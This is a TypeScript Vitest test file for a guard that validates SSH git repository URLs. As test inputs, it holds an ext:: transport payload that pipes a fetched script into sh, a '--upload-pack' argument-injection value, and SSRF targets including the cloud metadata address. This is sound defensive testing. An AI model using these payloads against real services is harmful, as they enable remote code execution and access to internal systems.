import { HTTPException } from 'hono/http-exception';
import { describe, expect, it, vi } from 'vitest';

// `ssh-host-guard.ts` imports `classifyGitRemote` from `provision-credential.js`,
// which also touches `db/client.js` at module scope (for its own
// `provisionGitCredential` export) — mock both so this pure-logic test doesn't
// need a live DATABASE_URL/JWT_SECRET, matching the pattern in
// `orgs/invitations-routes.test.ts`.
vi.mock('../config/env.js', () => ({
  env: { JWT_SECRET: 'test-secret-at-least-32-chars-long-abcdef', NODE_ENV: 'test' },
}));
vi.mock('../db/client.js', () => ({ db: {} }));

const { assertSafeSshRepoUrl } = await import('./ssh-host-guard.js');

describe('assertSafeSshRepoUrl', () => {
  it('rejects the ext:: transport (RCE via git ls-remote)', async () => {
    await expect(assertSafeSshRepoUrl('ext::sh -c "curl https://x/y|sh"')).rejects.toMatchObject({
      status: 400,
      cause: { code: 'INVALID_TRANSPORT' },
    });
  });

  it('rejects an http(s) URL', async () => {
    await expect(assertSafeSshRepoUrl('https://github.com/org/repo.git')).rejects.toBeInstanceOf(
      HTTPException,
    );
  });

  it('rejects a leading-dash argument-injection style URL', async () => {
    await expect(assertSafeSshRepoUrl('--upload-pack=evil')).rejects.toMatchObject({
      status: 400,
      cause: { code: 'INVALID_TRANSPORT' },
    });
  });

  it('rejects an ssh:// URL pointing at a loopback address', async () => {
    await expect(assertSafeSshRepoUrl('ssh://127.0.0.1/repo.git')).rejects.toMatchObject({
      status: 400,
      cause: { code: 'SSRF_BLOCKED' },
    });
  });

  it('rejects a git@ URL pointing at the cloud metadata address', async () => {
    await expect(assertSafeSshRepoUrl('git@169.254.169.254:repo.git')).rejects.toMatchObject({
      status: 400,
      cause: { code: 'SSRF_BLOCKED' },
    });
  });

  it('rejects a private RFC1918 host', async () => {
    await expect(assertSafeSshRepoUrl('git@10.0.0.5:org/repo.git')).rejects.toMatchObject({
      status: 400,
      cause: { code: 'SSRF_BLOCKED' },
    });
  });

  it('allows a well-formed ssh git@ URL to a public host', async () => {
    await expect(assertSafeSshRepoUrl('git@github.com:org/repo.git')).resolves.toBeUndefined();
  });

  it('allows a well-formed ssh:// URL to a public host', async () => {
    await expect(
      assertSafeSshRepoUrl('ssh://git@github.com/org/repo.git'),
    ).resolves.toBeUndefined();
  });
});
